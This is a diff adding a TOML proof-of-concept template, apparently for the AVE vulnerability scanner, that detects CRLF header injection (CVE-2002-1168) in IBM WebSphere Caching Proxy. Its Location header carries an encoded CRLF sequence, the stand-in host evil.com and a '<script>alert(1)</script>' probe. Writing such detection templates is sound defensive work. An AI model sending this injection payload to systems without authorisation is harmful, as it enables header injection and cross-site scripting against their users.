@@ -1,0 +1,29 @@
+[info]
+author = "AVE"
+description = "检测 IBM WebSphere Caching Proxy Server HTTP 响应头注入（CRLF）漏洞，通过发送包含 CRLF 序列的特制 Location 请求头，验证服务器是否在响应中回显注入的 HTML 内容"
+id = "POC-AVE-2002-0548"
+name = "CVE-2002-1168 PoC"
+severity = "medium"
+tags = ["cve-2002-1168"]
+vuln_id = [
+    "CVE-2002-1168",
+    "AVE-2002-0548",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+Location = "http://evil.com/%0a%0d%0a%0d<script>alert(1)</script>"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<script>alert(1)</script>"]
